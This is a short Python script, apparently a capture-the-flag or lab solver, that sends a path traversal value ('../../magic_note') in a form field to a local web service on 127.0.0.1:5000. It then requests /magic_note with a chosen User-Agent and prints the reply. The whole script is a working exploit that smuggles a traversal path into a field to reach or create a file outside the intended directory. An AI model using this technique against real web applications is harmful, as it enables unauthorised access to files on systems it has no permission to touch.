import requests

url = "http://127.0.0.1:5000/"

data = {"note":"../../magic_note"}


r = requests.post(url, data=data)

r = requests.get("http://127.0.0.1:5000/magic_note", headers={"User-Agent":"python-requests/2.29.0"})

print(r.text)
